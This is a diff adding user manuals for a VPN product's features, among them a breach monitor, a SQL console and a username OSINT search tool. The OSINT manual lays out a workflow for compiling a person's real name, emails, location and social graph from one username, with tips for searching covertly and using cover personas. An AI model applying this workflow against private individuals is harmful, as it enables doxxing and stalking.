+    Range minimum: 0–100ms (default: 1ms)
+    Range maximum: 1–500ms (default: 50ms)
+    Distribution: Uniform / Gaussian / Exponential
+
+  Dummy Traffic:
+    Rate: percentage of average bandwidth (0–100%)
+    Burst size: maximum dummy burst (default: 5 packets)
+    Frame type: Random / HTTP-like / WireGuard-like
+
+  Constant Bandwidth:
+    Rate: 256 Kbps / 1 Mbps / 5 Mbps / 10 Mbps / Custom
+    Overage handling: drop excess / queue excess
+
+  Apply profile presets:
+  • Stealth (journalist/activist): all 4 techniques, aggressive
+  • Balanced (default): padding + jitter + medium dummy traffic
+  • Performance: padding + light jitter only
+
+9. PERFORMANCE IMPACT
+
+  Latency added (per technique):
+  Packet Padding:      < 0.1ms (local processing only)
+  Timing Jitter:       1–50ms per packet (by design)
+  Dummy Traffic (20%): negligible compute, +20% bandwidth
+  Constant Bandwidth:  0ms additional latency
+
+  Throughput impact:
+  Padding (aggressive): up to 3× bandwidth usage (worst case)
+  Jitter:               no throughput impact (delays, not drops)
+  Dummy Traffic (20%):  +20% bandwidth usage
+  Constant Bandwidth:   fixed regardless of actual need
+
+  Recommended for interactive use (video calls, gaming):
+  Use Adaptive padding + Light jitter (1–10ms) + no dummy traffic
+  Constant Bandwidth is not suitable for latency-sensitive apps.
+
+10. WHAT DAITA DOES NOT PROTECT AGAINST
+
+  DAITA defeats passive traffic ANALYSIS. It does not:
+
+  ✗ Hide that you are using a VPN
+    → Your ISP still sees an encrypted WireGuard tunnel.
+    → Use Obfuscation (/obfuscation) to hide VPN usage itself.
+
+  ✗ Protect against active probing
+    → An adversary can still probe your VPN endpoint directly.
+    → Use Ghost Trap + Firewall to defend against active attackers.
+
+  ✗ Guarantee against future ML advances
+    → More powerful WF classifiers may partially break jitter+padding.
+    → Constant Bandwidth Mode is the only theoretically-proven defense.
+
+  ✗ Protect metadata that leaves the VPN tunnel
+    → DNS queries not routed through VPN
+    → WebRTC leaks (use Leak Detection to verify no leaks)
+
+  For maximum traffic analysis resistance: DAITA + Post-Quantum +
+  Obfuscation (obfs4/Snowflake) together.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "dark-web-monitor-manual",
+    title: "Dark Web Monitor",
+    subtitle: "Breach database monitoring, HIBP integration, wallet tracking, and dark web alerts",
+    version: "1.1",
+    pages: 12,
+    icon: Search,
+    iconColor: "text-red-400",
+    tier: "basic",
+    content: `Dark Web Monitor — User Manual
+Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+VPN Basic Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. How Monitoring Works
+3. Email Address Monitoring
+4. Password Breach Check (HIBP)
+5. Cryptocurrency Wallet Monitoring
+6. Phone Number & Personal Data Monitoring
+7. Dark Web Paste Site Monitoring
+8. Alert System
+9. Reading Breach Reports
+10. Remediation Steps After a Breach
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  The Dark Web Monitor (/dark-web) continuously monitors breach
+  databases, dark web marketplaces, paste sites, and underground
+  forums for your personal data. Get alerted the instant your
+  email, password, phone number, or cryptocurrency wallet address
+  appears in any known breach or data dump.
+
+  Backend: Express API at /api/dark-web
+  Frontend: /dark-web (VPN Basic)
+  Data sources: HIBP API, custom breach DB, paste monitoring,
+                blockchain address monitoring
+
+  Privacy guarantee: your monitored data is checked using
+  k-anonymity and hashing — the actual values are NEVER sent
+  to any external service in readable form.
+
+2. HOW MONITORING WORKS
+
+  Email/Password checking (HIBP k-anonymity):
+  Step 1: SHA-1 hash of the email or password is computed locally.
+  Step 2: First 5 characters of the hash are sent to HIBP API.
+  Step 3: HIBP returns all hashes starting with those 5 chars.
+  Step 4: Local comparison checks if your full hash is in the list.
+  → Your actual email or password NEVER leaves your device.
+
+  Custom breach database:
+  Proxyh VPN maintains a local breach database (updated daily)
+  with hashed credentials from known breaches. Monitoring is done
+  entirely locally against this database.
+
+  Paste site monitoring:
+  Automated crawlers scan Pastebin, Ghostbin, Rentry, and
+  similar paste sites for email addresses, phone numbers, and
+  cryptocurrency addresses matching your monitored identifiers.
+
+3. EMAIL ADDRESS MONITORING
+
+  Dark Web Monitor → Email tab → Add Email
+
+  Add up to 10 email addresses for continuous monitoring.
+  Each email is checked against:
+  • Have I Been Pwned (HIBP) — 700+ breaches indexed
+  • DeHashed breach database
+  • LeakLookup
+  • Custom paste site scraper
+
+  Per breach, you see:
+  • Breach name: which service was breached
+  • Breach date: when the breach occurred
+  • Verified: whether the breach is confirmed authentic
+  • Data classes exposed: Passwords, Phone numbers, IP addresses,
+    Physical addresses, Credit cards, Social Security Numbers,
+    Health records, Sexual preferences, etc.
+  • Record count: total users affected in that breach
+  • Source: HIBP / custom / paste
+
+  Severity color coding:
+  RED    — passwords or payment data exposed
+  ORANGE — personal identifiers (phone, address) exposed
+  YELLOW — email address + name only (lower risk)
+
+4. PASSWORD BREACH CHECK (HIBP)
+
+  Dark Web Monitor → Password Check tab
+
+  Enter any password to check if it appears in known breach dumps.
+  Uses HIBP k-anonymity API (see Section 2 for privacy guarantee).
+
+  Results:
+  FOUND: [N] times — this exact password appears in breach databases.
+  → The number indicates how commonly it appears. Any count > 0
+    means this password MUST be changed immediately everywhere it's used.
+
+  NOT FOUND — this password has not appeared in any indexed breach.
+  → This does NOT mean the password is strong. Use it as a
+    starting point for assessment only.
+
+  Best practice:
+  Check all your passwords — especially reused ones. Each FOUND
+  result is a credential that an attacker with the breach dump can
+  try directly (credential stuffing) against your other accounts.
+
+5. CRYPTOCURRENCY WALLET MONITORING
+
+  Dark Web Monitor → Wallets tab → Add Address
+
+  Monitor Bitcoin and Ethereum wallet addresses for:
+  • Appearance in dark web marketplace listings
+    (wallets used in ransomware, drug markets, stolen funds)
+  • Mention in paste sites or leak dumps
+  • Incoming transactions from known-malicious addresses
+    (ransomware wallets, sanctions-listed addresses)
+
+  Bitcoin address monitoring:
+  Checks address against:
+  • OFAC (US Treasury) sanctions list
+  • Known ransomware payment addresses
+  • Darknet market seizure databases (Hydra, AlphaBay, etc.)
+  • Blockchain transaction graph (funds received FROM flagged addrs)
+
+  Ethereum address monitoring:
+  Same as Bitcoin plus:
+  • FinCEN SAR (Suspicious Activity Reports) related addresses
+  • Known Tornado Cash input addresses
+  • Hacked protocol treasury addresses (Ronin, Wormhole, etc.)
+
+  Alert: if any of your monitored wallet addresses appears in
+  a dark web context or receives funds from a flagged source,
+  you receive an immediate breach alert.
+
+6. PHONE NUMBER & PERSONAL DATA MONITORING
+
+  Dark Web Monitor → Personal tab → Add Identifier
+
+  Monitor phone numbers, national ID formats, and physical
+  address components for appearance in breach databases.
+
+  Phone number monitoring:
+  Checks against:
+  • Facebook, LinkedIn, Twitter mega-breach databases
+  • Robocall/spam list appearances (your number sold to spammers)
+  • SIM-swapping attack databases (your number targeted)
+  • Dark web phone-to-SSN lookup services (your number auctioned)
+
+  What to do if your phone number appears:
+  1. Immediately contact your carrier and add a SIM-lock PIN.
+  2. Enable 2FA via an authenticator app (not SMS) everywhere.
+  3. Freeze your credit at all 3 bureaus (Equifax, Experian, TransUnion).
+  4. Monitor for SIM-swap attempt: watch for sudden loss of mobile signal.
+
+7. DARK WEB PASTE SITE MONITORING
+
+  Dark Web Monitor → Paste Monitor tab
+
+  Keyword-based monitoring of paste sites:
+  Add keywords — email addresses, usernames, company name,
+  domain names — to watch for.
+
+  When a new paste containing your keyword appears:
+  → Alert within 15 minutes
+  → Full paste content shown in alert panel
+  → Source paste URL (accessible via Tor through Onion Browser)
+  → Confidence score: how likely this is about you (vs. coincidence)
+
+  Common paste site findings:
+  • Credential dumps: username:password pairs for your domain
+  • Internal data leaks: employees dumping company data
+  • Config files: leaked API keys, database connection strings
+  • Personal data: doxxing posts containing your address/info
+
+8. ALERT SYSTEM
+
+  All breach alerts appear in Dark Web Monitor → Alerts tab.
+  Real-time (no polling delay — webhook-based where supported).
+
+  Alert types:
+  🔴 CRITICAL — password or payment data in active breach dump
+  🟠 HIGH     — personal identifiers (phone, SSN, address) exposed
+  🟡 MEDIUM   — email exposed in breach (password unknown/hashed)
+  🔵 INFO     — paste site mention (may or may not be your data)
+
+  For each alert:
+  • First detected: timestamp
+  • Source: which database/paste site
+  • Exact data exposed (redacted where sensitive)
+  • Recommended action (per-alert remediation guide)
+  • Dismiss: mark alert as acknowledged
+  • Escalate: mark as unresolved, stays visible until actioned
+
+9. READING BREACH REPORTS
+
+  Each breach entry shows:
+  Breach Name:    Name of the compromised service (e.g. "LinkedIn 2021")
+  Date:           When the breach occurred (may differ from when announced)
+  Added to DB:    When it was indexed in HIBP / our database
+  Verified:       YES = confirmed by HIBP or security researcher
+  PWN Count:      Total records in the breach (millions may be affected)
+  Data Classes:   Specifically what types of data were exposed
+
+  Data Class definitions:
+  Passwords         → raw or hashed password exposed
+  Email addresses   → email confirmed in breach
+  Usernames         → account login username
+  Phone numbers     → mobile/landline numbers
+  Physical addresses → home or work address
+  Government IDs     → SSN, passport, driver license numbers
+  Payment cards      → credit/debit card numbers (may be partial)
+  Health records     → medical history, prescriptions, diagnoses
+  IP addresses       → historical IP addresses used with the account
+  Dates of birth     → DOB for identity theft use
+
+10. REMEDIATION STEPS AFTER A BREACH
+
+  If PASSWORDS are exposed:
+  1. Immediately change the password on the breached service.
+  2. Check if you reused that password anywhere else.
+  3. Change it on EVERY service where it was reused.
+  4. Enable 2FA (TOTP app preferred over SMS) on the breached account.
+  5. Check for unauthorized activity in the account's login history.
+
+  If PAYMENT CARDS are exposed:
+  1. Contact your bank immediately — request new card number.
+  2. Review the last 90 days of transactions for unauthorized charges.
+  3. Set up real-time transaction alerts if not already active.
+
+  If PHONE NUMBERS are exposed:
+  1. Add a SIM-lock / port freeze with your carrier.
+  2. Replace SMS-based 2FA with authenticator apps everywhere.
+  3. Monitor for SIM-swap attempts (carrier notification).
+
+  If PHYSICAL ADDRESSES are exposed:
+  1. Set up mail forwarding to detect identity theft via mail.
+  2. Freeze credit at all 3 bureaus (free at annualcreditreport.com).
+  3. Set up fraud alerts.
+
+  If GOVERNMENT IDs (SSN) are exposed:
+  1. Immediately freeze credit (Equifax, Experian, TransUnion).
+  2. File an Identity Theft Report at identitytheft.gov.
+  3. Place an extended fraud alert (7 years) vs. standard (1 year).
+  4. Consider an IRS Identity Protection PIN.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "username-intel-manual",
+    title: "Username Intelligence",
+    subtitle: "OSINT username search across 100+ platforms, profile correlation, and dark web lookup",
+    version: "1.0",
+    pages: 12,
+    icon: Search,
+    iconColor: "text-pink-400",
+    tier: "pro",
+    content: `Username Intelligence — User Manual
+Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Platform Coverage (100+ platforms)
+3. Running a Username Search
+4. Reading Results
+5. Profile Correlation Engine
+6. Email & Real Name Discovery
+7. Dark Web & Breach Database Search
+8. Workflow: Username → Full OSINT Profile
+9. Operational Security When Searching
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  Username Intelligence (/username-intel) performs OSINT-grade
+  username searches simultaneously across 100+ platforms. Enter
+  a username and receive a comprehensive intelligence report:
+  profile links, linked emails, real names, locations, profile
+  photos, bio data, associated accounts, and any appearances in
+  breach databases.
+
+  All searches are routed through Tor by default (see Section 9
+  for OPSEC notes). No accounts or authentication required.
+
+  LEGAL NOTICE: Only search for usernames with legitimate purpose.
+  Searching for individuals without legal basis may violate privacy
+  laws (GDPR, CCPA). This tool is for authorized OSINT, security
+  research, and penetration testing with scope authorization only.
+
+2. PLATFORM COVERAGE (100+ PLATFORMS)
+
+  Social Media (24 platforms):
+    Twitter/X, Instagram, Facebook, TikTok, YouTube, Pinterest,
+    Tumblr, Mastodon, Snapchat, BeReal, Threads, LinkedIn (limited),
+    VSCO, Flickr, Reddit, Quora, Medium, Substack, Minds, MeWe,
+    Parler, Gab, Truth Social, Rumble
+
+  Developer & Technical (20 platforms):
+    GitHub (repos, gists, organizations, commit email),
+    GitLab, Bitbucket, npm (package author), PyPI (package author),
+    Crates.io (Rust), NuGet, HackerNews, Stack Overflow,
+    Dev.to, Hashnode, CodePen, JSFiddle, Replit, CodeSandbox,
+    Kaggle, Hugging Face, Devpost, Indie Hackers, Product Hunt
+
+  Gaming (18 platforms):
+    Steam, Xbox Gamertag, PlayStation Network, Epic Games,
+    Roblox, Fortnite (via tracker), Valorant (Riot tracker),
+    Minecraft, Discord (via Sherlock lookup), Twitch, Kick,
+    YouTube Gaming, Overwolf, Itch.io, Game Jolt,
+    Chess.com, Lichess, Faceit (CS2/FPS rank lookup)
+
+  Forums & Communities (14 platforms):
+    Reddit, 4chan (archived via FoolFuuka), 8kun (archived),
+    Telegram public channels, Keybase, Hackforums, RaidForums DB,
+    Nulled.to (frozen data), XDA Developers, Wilders Security,
+    Bleeping Computer, BleepingHelp, Proboards, Invision communities
+
+  Creative & Portfolio (10 platforms):
+    Behance, Dribbble, ArtStation, DeviantArt, Wattpad,
+    Soundcloud, Bandcamp, Spotify (artist search), Patreon, Ko-fi
+
+  Dark Web & Breach (6 sources):
+    Pastebin archive (10+ years of public pastes)
+    Ghostbin archives
+    DeHashed breach database (username field search)
+    Breach compilation username index
+    Dark web forum index (via Tor)
+    RockYou2021 username list check
+
+3. RUNNING A USERNAME SEARCH
+
+  Username Intel (/username-intel) → Search tab
+
+  Step 1: Enter the username to search.
+  Step 2: Select search scope:
+    Quick (30s): Social + Developer platforms only (40 platforms)
+    Standard (90s): All surface web platforms (80 platforms)
+    Full (3-5 min): All platforms including dark web (100+ platforms)
+
+  Step 3: Select routing:
+    Direct: fastest, but your ProxhqVPN IP is visible to platforms
+    Tor: anonymous, slower — recommended for OPSEC (Section 9)
+    Tor + SOCKS5 chain: maximum anonymity, slowest
+
+  Step 4: Click "Search".
+  Live results stream in as each platform responds.
+  Color coding: green = found, grey = not found, red = error/rate-limited
+
+  Concurrent platform checks: 15 simultaneous (rate-limited to avoid bans)
+
+4. READING RESULTS
+
+  For each platform where the username is FOUND:
+
+  Platform name + link:       direct link to the profile page
+  Status: FOUND / NOT FOUND / PRIVATE / RATE LIMITED / ERROR
+  Profile data (where available):
+    • Display name (real name or alias)
+    • Profile bio / description
+    • Profile photo URL
+    • Follower/following count
+    • Account creation date
+    • Last activity date
+    • Location (if declared)
+    • Website / linked URL
+    • Email (if publicly listed)
+
+  Confidence: HIGH / MEDIUM / LOW
+  • HIGH: username exists and profile data confirms same person
+  • MEDIUM: username exists but no cross-confirming data
+  • LOW: username exists but may be a different person (common username)
+
+5. PROFILE CORRELATION ENGINE
+
+  The Correlation Engine analyzes all found profiles to determine
+  which ones belong to the same person vs. name collision.
+
+  Correlation signals:
+  • Same profile photo (perceptual hash comparison)
+  • Same bio text or similar keywords
+  • Same website URL linked in multiple profiles
+  • Same location mentioned
+  • Linked social handles in profile bios
+  • Account creation dates clustering within same time period
+  • Username variation patterns (john_doe, johndoe, john.doe)
+
+  Correlation output:
+  HIGH CONFIDENCE CLUSTER — profiles almost certainly same person.
+  Combined profile card shows all cross-linked data in one view.
+
+  POSSIBLE MATCH — partial overlap, may be same person.
+  LIKELY DIFFERENT — different photo, different bio, different region.
+
+  Use the correlation clusters to build a unified target profile
+  from all matching accounts.
+
+6. EMAIL & REAL NAME DISCOVERY
+
+  For Developer platforms (GitHub, GitLab, npm, PyPI):
+  • GitHub API: commits may include the committer's email address
+    even if the profile email is hidden. The tool checks all
+    public commits for email addresses in author/committer fields.
+  • npm/PyPI: package author email often disclosed in package metadata.
+
+  Real name discovery:
+  • Cross-reference profile display names across all found accounts.
+  • Look for name variations: "John Doe", "johnd", "J. Doe".
+  • LinkedIn full name if profile is accessible.
+  • GitHub profile name field.
+
+  Aggregated output:
+  Possible real names:   John Doe, John D.
+  Possible emails:       john@example.com (from GitHub commit)
+  Geographic indicators: San Francisco, CA (from LinkedIn + Twitter)
+
+  NOTE: Only public data is used. No authenticated scraping.
+
+7. DARK WEB & BREACH DATABASE SEARCH
+
+  Full search scope includes:
+  Pastebin archive:
+  • 10+ years of public Pastebin posts indexed
+  • Search for the username string
+  • Context: credential dumps, leaks, doxxing posts
+  • Results show paste date, context snippet, full paste link
+
+  Breach compilation:
+  • Username field in DeHashed breach database
+  • Checks 15 billion+ breach records for username matches
+  • Shows which services the username was registered on
+  • Reveals password hash format (md5, bcrypt, plaintext)
+
+  Dark web forum index (via Tor):
+  • Searches known dark web forum archives
+  • Looks for username in posts, registrations, mentions
+  • Example forums indexed: RaidForums, Nulled, HackForums archives
+
+  Results are flagged with:
+  BREACH — username appeared in a data breach
+  PASTE — username appeared in a paste dump
+  DARK WEB — username mentioned on dark web resources
+
+8. WORKFLOW: USERNAME → FULL OSINT PROFILE
+
+  Step 1: Run Full Search on the target username.
+  Step 2: Review Correlation Engine clusters — identify the right person.
+  Step 3: Note all found platforms and profile data.
+  Step 4: Check Developer platforms for email disclosure (GitHub commits).
+  Step 5: Run Breach check on any discovered email via Dark Web Monitor.
+  Step 6: Run OSINT Recon (/osint) on any discovered domain/website.
+  Step 7: Compile full profile:
+    - Real name (from GitHub/LinkedIn/npm)
+    - Email addresses (from GitHub commits, npm, PyPI)
+    - Geographic location (from multiple profiles)
+    - Social graph (followers/following cross-analysis)
+    - Professional history (LinkedIn if accessible)
+    - Breach exposure (via Dark Web Monitor)
+    - Dark web mentions (from breach DB and paste check)
+
+  Export: Username Intel → Export → JSON or PDF report
+
+9. OPERATIONAL SECURITY WHEN SEARCHING
+
+  If you are investigating a subject who may be monitoring their
+  own profile for viewer activity, take precautions:
+
+  Always use Tor routing:
+  → Platforms cannot see your real IP address or ProxhqVPN IP.
+  → Profile view counts may still be incremented (unavoidable).
+
+  Do not click direct links to found profiles:
+  → Use the "Preview" button which fetches the page server-side.
+  → Direct clicks from your browser increment view/follower counts
+    and may appear in the subject's analytics.
+
+  Avoid repeated searches in quick succession:
+  → Rate limiting may trigger CAPTCHAs or temporary bans.
+  → Use Standard scope (90s) rather than Full for follow-up checks.
+
+  For truly covert OSINT:
+  → Route all Username Intel traffic through:
+    Tor + Double Hop VPN (VPN Coexistence → Double-Hop Mode)
+  → Use Alt Identity (/alt-identity) for cover persona if you
+    need to create accounts to access paywalled profile data.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "sql-interface-manual",
+    title: "SQL Interface — 3-Mode Database Console",
+    subtitle: "Local PostgreSQL (read-only), external DB full CRUD, and HTTP API → table mode",
+    version: "1.2",
+    pages: 14,
+    icon: Database,
+    iconColor: "text-green-400",
+    tier: "pro",
+    content: `SQL Interface — 3-Mode Database Console — User Manual
+Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Admin Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview & Mode Summary
+2. Mode 1 — Local DB (Read-Only)
+3. Mode 2 — External PostgreSQL (Full CRUD)
+4. Mode 3 — HTTP API Table
+5. Schema Explorer
+6. Connection Manager
+7. Query History
+8. Security Constraints
+9. Common Queries Reference
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW & MODE SUMMARY
+
+  The SQL Interface (/sql) provides a web-based database console
+  with three independent modes of operation:
+
+  MODE 1 — LOCAL DB (Read-Only)
+    Direct read access to the ProxhqVPN PostgreSQL database.
+    SELECT statements only. No INSERT/UPDATE/DELETE/DDL.
+    All platform tables visible and queryable.
+
+  MODE 2 — EXTERNAL POSTGRESQL (Full CRUD)
+    Connect to any external PostgreSQL database (AWS RDS, Supabase,
+    Neon, Railway, self-hosted). Full SQL access: SELECT, INSERT,
+    UPDATE, DELETE, CREATE TABLE, DROP TABLE, etc.
+    Multiple simultaneous connections supported.
+
+  MODE 3 — HTTP API TABLE
+    Execute HTTP GET/POST requests against any REST API and display
+    the JSON response as a sortable, filterable data table.
+    No database required — turns any API endpoint into a table.
+
+  Backend: Express API at /api/sql
+  Frontend: /sql (admin role required)
+
+2. MODE 1 — LOCAL DB (READ-ONLY)
+
+  Switch to: SQL Interface → tab "LOCAL DB"
+
+  Available operations:
+  • SELECT with all standard clauses (WHERE, JOIN, GROUP BY, ORDER BY,
+    LIMIT, OFFSET, subqueries, CTEs, window functions, etc.)
+  • EXPLAIN and EXPLAIN ANALYZE (query plan inspection)
+  • Information schema queries
+
+  BLOCKED operations:
+  INSERT, UPDATE, DELETE, TRUNCATE, DROP, CREATE, ALTER, GRANT,
+  REVOKE, VACUUM, COPY, pg_terminate_backend, and any function
+  that modifies data.
+
+  All 60+ ProxhqVPN tables are accessible:
+
+  Core tables:
+    nodes               — VPN node registry
+    beacon_alerts       — spider/worm/beacon alerts
+    silk_web_entities   — SilkWeb trapped entities
+    firewall_rules      — active firewall rules
+    blocked_ips         — blocked IP entries
+    user_wg_configs     — per-user WireGuard configs
+    canary_tokens       — deployed canary tokens
+    canary_triggers     — token trigger log
+
+  Intelligence tables:
+    ghost_trace_observations  — behavioral analysis events
+    ghost_trace_baselines     — per-peer traffic baselines
+    attack_chain_scans        — Ghost Chain scan results
+    attack_chain_findings     — individual chain findings
+
+  QuantumAudit tables:
+    scan_jobs           — audit job queue
+    vulnerabilities     — per-scan vulnerability findings
+    quantum_analyses    — post-quantum threat analysis
+    quantum_threats     — detected quantum-vulnerable algorithms
+
+  Ambassador tables:
+    ambassadors         — ambassador profiles
+    ambassador_videos   — ambassador video entries
+    ambassador_referrals — referral tracking
+
+  Example queries:
+
+  Recent beacon alerts (last 24 hours):
+    SELECT alert_type, source_ip, destination_ip, probe_type,
+           created_at
+    FROM beacon_alerts
+    WHERE created_at > NOW() - INTERVAL '24 hours'
+    ORDER BY created_at DESC
+    LIMIT 100;
+
+  Top blocked IPs by hit count:
+    SELECT ip_address, reason, hit_count, last_seen
+    FROM blocked_ips
+    ORDER BY hit_count DESC
+    LIMIT 25;
+
+  Active WireGuard nodes with peer count:
+    SELECT n.id, n.ip_address, n.location, n.status,
+           COUNT(uwc.id) AS peer_count
+    FROM nodes n
+    LEFT JOIN user_wg_configs uwc ON uwc.node_id = n.id
+    GROUP BY n.id
+    ORDER BY peer_count DESC;
+
+3. MODE 2 — EXTERNAL POSTGRESQL (FULL CRUD)
+
+  Switch to: SQL Interface → tab "EXTERNAL DB"
+
+  Step 1 — Add a connection:
+    SQL Interface → Connections → + Add Connection
+    Connection string format:
+      postgresql://username:password@host:5432/dbname
+      postgresql://username:password@host:5432/dbname?sslmode=require
+
+    Or fill individual fields:
+    Host:     your-db.region.rds.amazonaws.com
+    Port:     5432
+    Database: myapp_production
+    Username: admin
+    Password: ******* (masked in UI)
+    SSL:      Required / Preferred / Disabled
+
+    Click "Test Connection" before saving.
+    Connection pool: max 10 connections per external DB.
+
+  Step 2 — Select connection from dropdown.
+  Step 3 — Run any SQL.
+
+  Full CRUD and DDL is allowed:
+    SELECT, INSERT, UPDATE, DELETE, TRUNCATE
+    CREATE TABLE, ALTER TABLE, DROP TABLE
+    CREATE INDEX, CREATE VIEW
+    BEGIN, COMMIT, ROLLBACK (transaction support)
+
+  Connection security:
+  • Connection strings are stored in memory only (not persisted).
+  • Credentials are masked in the UI and never logged.
+  • Connections auto-close after 5 minutes of inactivity.
+  • Maximum 10 connections per session.
+
+  Supported databases:
+  PostgreSQL 11+, AWS RDS PostgreSQL, Aurora PostgreSQL,
+  Supabase, Neon, Railway, ElephantSQL, CockroachDB (Postgres-compat),
+  Google Cloud SQL for PostgreSQL, Azure PostgreSQL
+
+4. MODE 3 — HTTP API TABLE
+
+  Switch to: SQL Interface → tab "HTTP API"
+
+  Turns any JSON REST API endpoint into a queryable data table.
+
+  Configuration:
+  URL:      https://api.example.com/v1/users
+  Method:   GET / POST
+  Headers:  Authorization: Bearer token
+  Body:     (for POST — JSON body)
+  Path:     JSON path to the array in response (e.g. "data.items")
+
+  How it works:
+  1. The ProxhqVPN server makes the HTTP request (through your VPN).
+  2. The JSON response is parsed.
+  3. If the response is an array (or nested array at JSON path):
+     → Each array element becomes a table row.
+     → Object keys become column headers.
+  4. The table is sortable, filterable, and searchable.
+  5. Export as CSV or JSON.
+
+  Example use cases:
+  • Query your GitHub repository list: GET /user/repos
+  • Check AWS EC2 instances via boto3-backed API
+  • Browse a Stripe payment list: GET /v1/charges
+  • Inspect a REST API response without writing code
+  • Build a quick admin view over any JSON endpoint
+
+  JSON path examples:
+  Response: { "data": { "items": [...] } }
+  → Path: "data.items"
+
+  Response: [ {...}, {...} ] (top-level array)
+  → Path: (leave blank)
+
+  Response: { "results": [...], "meta": {...} }
+  → Path: "results"
+
+5. SCHEMA EXPLORER
+
+  SQL Interface → Schema tab (available in LOCAL DB and EXTERNAL DB modes)
+
+  Left panel: list of all tables in the selected database.
+  Click any table to expand:
+  • Column name
+  • Data type (text, integer, uuid, timestamptz, jsonb, etc.)
+  • Nullable: YES / NO
+  • Default value
+  • Foreign key relationships (if any)
+  • Primary key indicator
+
+  Click "Query this table":
+  → Auto-generates a SELECT * FROM [table] LIMIT 50 and runs it.
+
+  Index explorer:
+  Schema → Indexes tab → shows all indexes per table with type (btree, hash, gin)
+
+  Row count estimates:
+  Schema → Stats tab → estimated row counts per table (from pg_stat_user_tables)
+
+6. CONNECTION MANAGER
+
+  SQL Interface → Connections tab (External DB mode only)
+
+  Saved connections (session-only — not persisted to disk):
+  • Name, host, database, username (password masked)
+  • Test button: verify connectivity before running queries
+  • Active indicator: green dot if currently connected
+
+  Pool status:
+  Each external connection shows current pool usage:
+  "3/10 connections in use"
+
+  Close a connection:
+  Click X on the connection → pool is drained and closed.
+
+  NOTE: Connections are in-memory only. They are lost if the
+  API server restarts or if you refresh the page.
+  Re-enter credentials after any server restart.
+
+7. QUERY HISTORY
+
+  SQL Interface → History tab
+
+  Stores the last 100 queries per session:
+  • Timestamp, mode, connection, query text, row count, duration
+  • Click any query to reload it into the editor
+  • Copy query to clipboard
+  • Star (favorite) queries for quick access
+
+  Query templates (pre-built common queries):
+  SQL Interface → Templates tab:
+  • Active connections (pg_stat_activity)
+  • Table sizes (pg_relation_size)
+  • Index usage stats
+  • Long-running queries
+  • Blocking queries
+  • Last N rows per table
+
+8. SECURITY CONSTRAINTS
+
+  Local DB mode:
+  • SELECT only — no data modification
+  • Query timeout: 30 seconds (prevents long-running analytics)
+  • Result limit: 10,000 rows maximum
+  • No direct pg_catalog access to sensitive system tables
+
+  External DB mode:
+  • Full SQL — admin responsibility to use appropriately
+  • Queries run with the credentials you provide — no privilege escalation
+  • 30-second query timeout (adjustable to 120s max)
+  • Connection strings are never logged
+
+  HTTP API mode:
+  • All requests route through the ProxhqVPN server IP
+  • 30-second request timeout
+  • Response size limit: 10 MB (prevents memory exhaustion)
+
+  Admin role required for all modes. Clerk auth enforced.
+  All queries visible in Terminal → Audit Log (if terminal is used).
+
+9. COMMON QUERIES REFERENCE
+
+  ProxhqVPN Local DB quick reference:
+
+  All active VPN nodes:
+    SELECT * FROM nodes WHERE status = 'active';
+
+  Firewall rules (active only, by priority):
+    SELECT rule_type, direction, ip_cidr, port, protocol, description
+    FROM firewall_rules
+    WHERE active = true
+    ORDER BY priority ASC;
+
+  Ghost Trace anomalies (score > 60):
+    SELECT peer_id, anomaly_score, alert_type, created_at
+    FROM ghost_trace_observations
+    WHERE anomaly_score > 60
+    ORDER BY anomaly_score DESC
+    LIMIT 50;
+
+  Canary token trigger log (last 7 days):
+    SELECT ct.name, ct.token_type, tr.source_ip,
+           tr.user_agent, tr.triggered_at
+    FROM canary_triggers tr
+    JOIN canary_tokens ct ON ct.id = tr.token_id
+    WHERE tr.triggered_at > NOW() - INTERVAL '7 days'
+    ORDER BY tr.triggered_at DESC;
+
+  Ambassador referral earnings:
+    SELECT a.name, a.promo_code,
+           COUNT(ar.id) AS referrals,
+           SUM(ar.commission_amount) AS total_commission
+    FROM ambassadors a
+    LEFT JOIN ambassador_referrals ar ON ar.ambassador_id = a.id
+    GROUP BY a.id
+    ORDER BY total_commission DESC;
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "vpn-coexist-manual",
+    title: "VPN Coexistence",
+    subtitle: "fwmark, double-hop, network namespace, and routing-table modes for running alongside any VPN",
+    version: "1.1",
+    pages: 14,
+    icon: Settings,
+    iconColor: "text-cyan-400",
+    tier: "pro",
+    content: `VPN Coexistence — User Manual
+Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview & Use Cases
+2. Auto-Detection of Running VPNs
+3. Mode 1 — fwmark (Recommended)
+4. Mode 2 — Double-Hop
+5. Mode 3 — Network Namespace
+6. Mode 4 — Routing Table
+7. Exception Rules
